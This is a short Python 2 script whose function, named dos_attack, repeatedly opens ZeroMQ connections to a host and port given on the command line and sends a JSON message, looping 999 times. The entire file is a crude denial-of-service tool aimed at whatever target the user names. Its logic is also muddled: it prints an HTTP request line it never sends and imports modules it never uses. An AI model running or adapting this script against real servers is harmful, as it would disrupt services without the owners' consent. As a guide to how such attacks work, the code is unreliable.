import socket, sys, json, os
from payloads import *
import pickle
import zmq

def dos_attack():
    # pid = os.fork()
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ctx = zmq.Context.instance()
    server_socket = ctx.socket(zmq.REQ)
    server_socket.connect("tcp://" + str(sys.argv[1]) + ":" + str(sys.argv[2]))
    # address = (sys.argv[1], int(sys.argv[2]))
    # s.connect(address)
    print ">> GET /" + sys.argv[2] + " HTTP/1.1"
    server_socket.send_json({"msg": "Connect"})
    # s.close()


if __name__ == '__main__':
    for i in range(1, 1000):
        dos_attack()
